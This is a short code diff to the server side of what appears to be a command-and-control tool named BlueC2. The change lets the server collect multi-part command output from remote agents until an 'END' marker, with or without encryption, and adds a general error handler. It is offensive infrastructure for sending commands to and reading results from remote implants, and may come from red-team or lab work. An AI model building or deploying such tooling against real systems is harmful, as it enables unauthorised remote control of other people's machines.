@@ -115,12 +115,24 @@ class BlueServer:
         try:
             if self.encryption == True:
                 agent.sock.send(self.encrypt(cmd.encode()))
-                reply = self.decrypt(agent.sock.recv(65535)).decode()
-                print(str(agent),reply,sep="\n")
+                result = ""
+                while True:
+                    reply = self.decrypt(agent.sock.recv(65535)).decode()
+                    if reply == "END":
+                        break
+                    else:
+                        result+=reply
+                print(str(agent),result,sep="\n")
             else:
                 agent.sock.send(cmd.encode())
-                reply = agent.sock.recv(65535).decode()
-                print(str(agent),reply,sep="\n")
+                result = ""
+                while True:
+                    reply = agent.sock.recv(65535).decode()
+                    if reply == "END":
+                        break
+                    else:
+                        result+=reply
+                print(str(agent),result,sep="\n")
         except UnicodeDecodeError:
             print(str(agent)+"\nERROR: Unicode Decode Error")
         except ConnectionResetError:
@@ -129,6 +141,8 @@ class BlueServer:
             self.targets.remove(agent)
         except BrokenPipeError:
             print(str(agent)+f"\nERROR: Broken pipe error\n")
+        except Exception as e:
+            print(str(agent)+f"\nERROR: Unknown error\n{str(e)}")
 
     def start(self):
         logging.info("BlueC2 server starting:"+self.get_timestamp())
